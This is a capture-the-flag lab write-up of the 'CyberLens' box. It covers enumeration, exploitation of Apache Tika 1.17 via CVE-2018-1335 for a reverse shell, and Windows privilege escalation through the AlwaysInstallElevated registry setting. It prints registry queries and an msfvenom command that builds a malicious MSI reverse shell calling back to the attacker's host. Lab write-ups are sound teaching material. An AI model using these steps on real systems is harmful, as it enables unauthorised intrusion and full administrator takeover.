---
title: "CyberLens"
description: "Enum Port 80 - http Accessing port 80 Dirsearch: let’s we check the page one by one, on js page we found something interesting, that was javascript script that is used by the"
lang: "en"
translationKey: "cyberlens"
category: "lab-writeups"
tags: ["Lab", "apache Tika 1.17", "CVE-2018-1335", "Privesc AlwaysInstallElevated", "Windows", "Easy"]
publishDate: "2025-10-03"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "2815fca1-ed80-80c5-a755-da92301b569e"
notionUrl: "https://app.notion.com/p/CyberLens-2815fca1ed8080c5a755da92301b569e"
notionLastEdited: "2025-10-04T17:00:00.000Z"
---

# Enum

![](/images/cyberlens/bd1e4d368b60.png)

## Port 80 - http

Accessing port 80

![](/images/cyberlens/6c62b57ce5a5.png)

Dirsearch:

![](/images/cyberlens/2398c7c5e475.png)

let’s we check the page one by one, on js page we found something interesting, that was javascript script that is used by the webapp, image-extractor.js.

![](/images/cyberlens/40cb0c577c98.png)

see it fetch something on port 61777 let’s we move into that port

## Port 61777 - http

accessing port 61777

![](/images/cyberlens/2a7676c0a72d.png)

from the website we succeed to identify that the server using apache tika version 1.17, let’s we looking for public exploit which is related on that version.

![](/images/cyberlens/13c2e26bd8e7.png)

![](/images/cyberlens/ad566abe3d61.png)

reading the exploit it explain that we can use the exploit script to run command on the server, so let’s download the exploit script and run it to establish revshell

![](/images/cyberlens/fcfcbfad0c36.png)

revshell succeed to be established, now let’s get the flag user and doing privesc

![](/images/cyberlens/14fe1414dd79.png)

# WinPriv

running winpeas.exe on the target

![](/images/cyberlens/1c94a0b85293.png)

Manual:

```javascript
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![](/images/cyberlens/161dcc4e1cc3.png)

when enumerate the system we discovered that the **AlwaysInstallElevated** registry key wasenabled, indicating that MSI packages could be installed with elevated privileges. so I make a malicious MSI which will establish the revshell then I’ll install it in server target.

```javascript
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.211.1 LPORT=443 -a x64 --platform Windows -f msi -o rev.msi

```

![](/images/cyberlens/14a1f206aa44.png)

![](/images/cyberlens/ab910c55cb8f.png)

Voila we got adminitrator acces and the admin flag.
